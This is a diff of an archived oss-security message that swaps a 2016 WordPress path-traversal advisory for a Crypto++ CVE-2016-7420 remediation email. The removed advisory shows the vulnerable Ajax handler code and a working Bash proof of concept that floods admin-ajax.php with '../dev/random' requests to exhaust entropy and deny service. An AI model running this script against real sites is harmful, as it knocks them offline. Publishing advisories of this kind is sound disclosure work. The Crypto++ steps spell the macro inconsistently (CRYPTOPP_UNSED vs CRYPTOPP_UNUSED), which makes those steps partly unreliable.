@@ -1,144 +1,103 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/08/20/2
-Message-ID: <b9077094-e1d3-cfd5-5c97-1ddf970d8a9a@securify.nl>
-Date: Sat, 20 Aug 2016 11:05:47 +0200
-From: Summer of Pwnage <lists@...urify.nl>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/09/19/6
+Message-ID: <CAH8yC8nJ5cqnEdkqRK1AfSM=kCNyFw=rahiWL86Xih5fO9afmQ@mail.gmail.com>
+Date: Mon, 19 Sep 2016 10:34:47 -0400
+From: Jeffrey Walton <noloader@...il.com>
 To: oss-security@...ts.openwall.com
-Subject: Path traversal vulnerability in WordPress Core Ajax handlers
+Subject: Fwd: CVE-2016-7420 (Info Disclosure due to assert), Crypto++ and down level remediation
 Content-Type: text/plain; charset=utf-8
 
-------------------------------------------------------------------------
-Path traversal vulnerability in WordPress Core Ajax handlers
-------------------------------------------------------------------------
-Yorick Koster, July 2016
+---------- Forwarded message ----------
+From: Jeffrey Walton <noloader@...il.com>
+Date: Mon, Sep 19, 2016 at 10:32 AM
+Subject: CVE-2016-7420 (Info Disclosure due to assert), Crypto++ and
+down level remediation
+To: <redacted; maintainers and distros>
 
-------------------------------------------------------------------------
-Abstract
-------------------------------------------------------------------------
-A path traversal vulnerability was found in the Core Ajax handlers of
-the WordPress Admin API. This issue can (potentially) be used by an
-authenticated user (Subscriber) to create a denial of service condition
-of an affected WordPress site.
+Hi Everyone,
 
-------------------------------------------------------------------------
-OVE ID
-------------------------------------------------------------------------
-OVE-20160712-0036
+Crypto++ 5.6.5 will be released within a month or so to remediate the
+information disclosure from CVE-2016-742. Distros will need to patch
+Crypto++ 5.6.4 and below. The following provides more information and
+procedures we recommend for down level Crypto++.
 
-------------------------------------------------------------------------
-See also
-------------------------------------------------------------------------
-#37490 [2] - Improve capability checks in wp_ajax_update_plugin() and
-wp_ajax_delete_plugin()
+We re-engieered the "debugging and diagnostic" support area because
+documenting the behaviors did *not* reduce the risk; rather it simply
+moved the blame around. You can see the staged changes at
+https://github.com/weidai11/cryptopp/issues/277#issuecomment-247829210
+.
 
-------------------------------------------------------------------------
-Tested versions
-------------------------------------------------------------------------
-This issue was successfully tested on the WordPress version 4.5.3.
+We believe the best course of action for a distor is to make the
+asserts inert in Crypto++ 5.6.4 and below because they are expected to
+be removed by NDEBUG. However and simple sed and 's|<exp>||g' won't
+work as expected.
 
-------------------------------------------------------------------------
-Fix
-------------------------------------------------------------------------
-WordPress version 4.6 [3] mitigates this vulnerability by moving the
-CSRF check to the top of the affected method(s).
+If you have any problems or questions, then please email me or call
+me. My cell number is <redacted>. My home number is
+<redacted>. Distros get special treatment because they are so
+important to the ecosystem.
 
-------------------------------------------------------------------------
-Introduction
-------------------------------------------------------------------------
-WordPress is web software that can be used to create a website, blog,
-or app. A path traversal vulnerability exists in the Core Ajax handlers
-of the WordPress Admin API. This issue can (potentially) be used by an
-authenticated user (Subscriber) to create a denial of service condition
-of an affected WordPress site.
+My apologies for the inconvenience and trouble this has caused.
 
-------------------------------------------------------------------------
-Details
-------------------------------------------------------------------------
-The path traversal vulnerability exists in the file ajax-actions.php, in
-particular in the function wp_ajax_update_plugin(). The vulnerable code
-is shown below.
+Jeff
 
-function wp_ajax_update_plugin() {
-	global $wp_filesystem;
+**********
 
-	$plugin = urldecode( $_POST['plugin'] );
+To remediate CVE-2016-7420 in Crypto++ 5.6.4 and below, perform the following.
 
-	$status = array(
-		'update'     => 'plugin',
-		'plugin'     => $plugin,
-		'slug'       => sanitize_key( $_POST['slug'] ),
-		'oldVersion' => '',
-		'newVersion' => '',
-	);
+1. Crypto++ 5.6.2 and below (Crypto++ 5.6.4 and 5.6.3 has it, so skip
+this step).
 
-	$plugin_data = get_plugin_data( WP_PLUGIN_DIR . '/' . $plugin );
-	if ( $plugin_data['Version'] ) {
-		$status['oldVersion'] = sprintf( __( 'Version %s' ), 
-$plugin_data['Version'] );
-	}
+    (a) Add CRYPTOPP_UNSED macro to config.h
 
-	if ( ! current_user_can( 'update_plugins' ) ) {
-		$status['error'] = __( 'You do not have sufficient permissions to 
-update plugins for this site.' );
-  		wp_send_json_error( $status );
-	}
+     #define CRYPTOPP_UNSED(x) ((void)(x))
 
-	check_ajax_referer( 'updates' );
+2. Change every assert() to CRYPTOPP_UNUSED()
 
-As can be seen in the code above, the function first tries to retrieve
-some version information from the target plugin. After this is done, it
-checks the user's privileges and it will verify the nonce (to prevent
-Cross-Site Request Forgery). The code that retrieves the version
-information from the plugin is vulnerable to path traversal. Since the
-security checks are done at a later stage, the affected code is
-reachable by any logged on user, including Subscribers.
+    (a) replace en masse
+    (b) find with sed or grep and 'assert[[:space:]]*('
 
-Potentially this issue can be used to disclose information, provided
-that the target file contains a line with Version:. What is more
-important that it also allows for a denial of service condition as the
-logged in attacker can use this flaw to read up to 8 KB of data from
-/dev/random. Doing this repeatedly will deplete the entropy pool, which
-causes /dev/random to block; blocking the PHP scripts. Using a very
-simple script, it is possible for an authenticated user (Subscriber) to
-bring down a WordPress site. It is also possible to trigger this issue
-via Cross-Site Request Forgery as the nonce check is done too late in
-this case.
+3. Verify changes
 
-------------------------------------------------------------------------
-Proof of concept
-------------------------------------------------------------------------
-The following Bash script can be used to trigger the denial of service
-condition.
+    (a) cat *.h *.cpp | egrep -v '(<|>|//)' | grep assert
+    (b) should only see compile-time assert
 
-#!/bin/bash
-target="http://<target>"
-username="subscriber"
-password="password"
-cookiejar=$(mktemp)
-	
-# login
-curl --cookie-jar "$cookiejar" \
-	--data
-"log=$username&pwd=$password&wp-submit=Log+In&redirect_to=%2f&testcookie=1" 
-\
-	"$target/wp-login.php" \
-	>/dev/null 2>&1
-	
-# exhaust apache
-for i in `seq 1 1000`
-	do
-		curl --cookie "$cookiejar" \
-		--data 
-"plugin=../../../../../../../../../../dev/random&action=update-plugin" \
-		"$target/wp-admin/admin-ajax.php" \
-		>/dev/null 2>&1 &
-done
-	
-rm "$cookiejar"
-------------------------------------------------------------------------
-References
-------------------------------------------------------------------------
-[1] 
-https://sumofpwn.nl/advisory/2016/path_traversal_vulnerability_in_wordpress_core_ajax_handlers.html
-[2] https://core.trac.wordpress.org/ticket/37490
-[3] https://wordpress.org/wordpress-4.6.zip
+4. Test changes
+
+    (a) 'make clean && make -j 4'
+    (b) './cryptest.exe v'
+
+5. Update the package
+
+    (a) rebuild the library and package it
+          - all asserts rendered inert
+    (b) rebuild all dependent packages
+          - asserts in Crypto++ headers could cross-pollinate
+
+**********
+
+Procedures performed on Crypto++ 5.6.2:
+
+# Prepare
+$ git clone https://github.com/weidai11/cryptopp cryptopp-assert
+$ cd cryptopp-assert
+$ git checkout CRYPTOPP_5_6_2
+
+# Step 1 (Add)
+$ echo "#define CRYPTOPP_UNUSED(x) ((void)(x))" >> config.h
+
+# Step 2 (Replace)
+$ sed -i "" 's|assert[[:space:]]*(|CRYPTOPP_UNUSED(|g' *.h *.cpp
+
+# Step 3 (Verify)
+$ cat *.h *.cpp | egrep -v '(<|>|//)' | grep assert
+#define CRYPTOPP_COMPILE_ASSERT(assertion)
+CRYPTOPP_COMPILE_ASSERT_INSTANCE(assertion, __LINE__)
+#define CRYPTOPP_COMPILE_ASSERT_INSTANCE(assertion, instance)
+
+# Step 4 (Test)
+$ make clean && make -j 4
+$ ./cryptest.exe v   # Tail should report no failures
+
+# Step 5 (Repackage)
+...
